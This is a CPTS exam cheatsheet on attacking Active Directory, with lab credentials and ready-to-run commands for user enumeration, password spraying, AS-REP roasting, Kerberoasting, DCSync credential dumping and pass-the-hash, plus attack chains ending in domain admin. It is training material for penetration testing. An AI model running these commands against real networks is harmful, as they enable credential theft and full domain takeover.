# Active Directory Enumeration & Attacks — Exam Cheatsheet

> Fast reference for CPTS exam. Full section guides in numbered .md files.

---

## Lab Credentials

| Host | User | Password | Access |
|------|------|----------|--------|
| MS01 (Windows attack host) | htb-student | `Academy_student_AD!` | RDP |
| ATTACK01 (Parrot Linux) | htb-student | `HTB_@cademy_stdnt!` | SSH or xfreerdp |

```bash
# RDP to Windows attack host
xfreerdp /v:MS01_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution

# SSH to Parrot attack host
ssh htb-student@ATTACK01_IP

# xfreerdp to Parrot (for BloodHound GUI)
xfreerdp /v:ATTACK01_IP /u:htb-student /p:'HTB_@cademy_stdnt!' /cert:ignore /dynamic-resolution
```

## Tool Locations

| Host | Path |
|------|------|
| Windows (MS01) | `C:\Tools\` |
| Linux (ATTACK01) | `/opt/` or in PATH |

---

## Core Attack Paths

### Unauthenticated → Foothold
```bash
# Username enumeration
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# NULL session enumeration
enum4linux -a TARGET_IP
smbclient -L //TARGET_IP -N
nxc smb TARGET_IP -u '' -p '' --users

# AS-REP roasting (no pre-auth required)
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Password spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123'
nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success
```

### Authenticated → Privilege Escalation
```bash
# BloodHound collection
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c all

# Kerberoasting
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request

# DCSync (if DA or replication rights)
secretsdump.py DOMAIN/USER:PASS@DC_IP

# Pass-the-Hash
evil-winrm -i TARGET -u USER -H NTLM_HASH
psexec.py DOMAIN/USER@TARGET -hashes :NTLM_HASH
```

### Key Attack Chains (from real-world scenarios)
1. **SYSTEM on host → Kerberoast → crack hash → write access shares → SCF file → Responder → NetNTLMv2 → DA**
2. **NULL session → user list + policy → password spray → BloodHound → local admin host → active DA session → pass-the-ticket → DA**
3. **Kerbrute enum → LinkedIn usernames → spray → RDP access → spray again → ACL abuse → Shadow Credentials → DCSync**

---

## Key Tools Quick Reference

| Tool | Use |
|------|-----|
| `kerbrute` | Username enum, password spray via Kerberos |
| `bloodhound-python` | AD graph collection from Linux |
| `BloodHound` | Visual attack path analysis |
| `Responder` | LLMNR/NBT-NS/MDNS poisoning → NTLMv2 capture |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP roasting |
| `secretsdump.py` | DCSync, SAM/LSA/NTDS dump |
| `evil-winrm` | WinRM shell with pass-the-hash |
| `nxc` (netexec) | Swiss army knife — SMB/LDAP/WinRM spray & enum |
| `enum4linux` | SMB/LDAP enumeration, NULL sessions |
| `ldapsearch` | Raw LDAP queries |
| `Rubeus` | Kerberos ticket abuse (Windows) |
| `Mimikatz` | Credential extraction (Windows) |
| `PowerView` | AD enumeration from PowerShell |
| `SharpHound` | BloodHound collection from Windows |
